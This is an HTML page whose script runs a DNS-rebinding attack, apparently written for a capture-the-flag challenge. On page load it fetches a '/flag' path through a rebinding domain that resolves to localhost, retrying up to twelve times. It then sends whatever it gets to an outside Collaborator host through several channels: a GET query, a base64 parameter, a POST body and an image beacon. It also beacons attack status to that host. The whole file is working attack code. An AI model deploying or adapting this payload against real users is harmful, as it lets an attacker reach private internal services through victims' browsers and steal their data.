<!DOCTYPE html>
<html>
<body>
<script>
const COLLAB = '5ouoqzco46uuh4ombiepx7w87zdr1iv6k.oastify.com';
const DNS_REBIND_DOMAIN = '7f000001.9df01723.rbndr.us';

let attempt = 0;

function attack() {
    attempt++;
    
    // Try to fetch via DNS rebinding (will resolve to localhost:80 internally)
    fetch('http://' + DNS_REBIND_DOMAIN + '/flag')
        .then(response => {
            if (response.ok) {
                return response.text();
            }
            throw new Error('HTTP ' + response.status);
        })
        .then(data => {
            // SUCCESS! We got the flag
            console.log('FLAG FOUND:', data);
            
            // Send to collaborator via multiple methods
            fetch('https://' + COLLAB + '/?flag=' + encodeURIComponent(data));
            fetch('https://' + COLLAB + '/?data=' + btoa(data));
            
            // POST request
            fetch('https://' + COLLAB, {
                method: 'POST',
                body: 'FLAG=' + encodeURIComponent(data)
            });
            
            // Image beacon
            const img = new Image();
            img.src = 'https://' + COLLAB + '/img?flag=' + btoa(data);
            
            // Display on page
            document.body.innerHTML = `
                <h1 style="color: green;">ðŸŽ¯ SUCCESS!</h1>
                <h2>Flag: ${data}</h2>
                <p>Attempt: ${attempt}</p>
            `;
        })
        .catch(error => {
            console.log('Attempt ' + attempt + ' failed:', error.message);
            
            // Retry after delay (DNS TTL)
            if (attempt < 12) {
                document.body.innerHTML = `
                    <h3>Attempt ${attempt} failed</h3>
                    <p>Retrying in 2 seconds...</p>
                    <p>Error: ${error.message}</p>
                `;
                setTimeout(attack, 2000);
            } else {
                document.body.innerHTML = '<h3 style="color: red;">Max attempts reached</h3>';
                fetch('https://' + COLLAB + '/?status=failed&attempts=' + attempt);
            }
        });
}

// Start the attack
console.log('Starting DNS Rebinding attack...');
fetch('https://' + COLLAB + '/?start=1&domain=' + DNS_REBIND_DOMAIN);
setTimeout(attack, 1000);
</script>
<h3>DNS Rebinding Attack in Progress...</h3>
<p>Target: http://7f000001.9df01723.rbndr.us/flag</p>
</body>
</html>
